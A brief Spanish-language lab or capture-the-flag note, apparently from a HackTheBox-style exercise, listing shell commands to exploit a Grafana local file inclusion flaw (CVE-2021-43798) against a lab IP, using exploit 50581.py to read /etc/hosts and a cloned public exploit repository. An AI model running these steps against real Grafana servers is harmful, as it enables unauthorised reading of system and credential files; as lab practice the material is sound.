
### EXPLOTAR GRAFANA LFI
```shell
❯ searchsploit grafana
```

**LFI**
```shell
# METODO 1
❯ python3 50581.py -H http://10.10.11.183:3000
Read file > /etc/hosts

# METODO 2
❯ git clone https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798.git
❯ nvim targets.txt
❯ cat targets.txt
	http://10.10.11.183:3000
❯ python3 exploit.py
```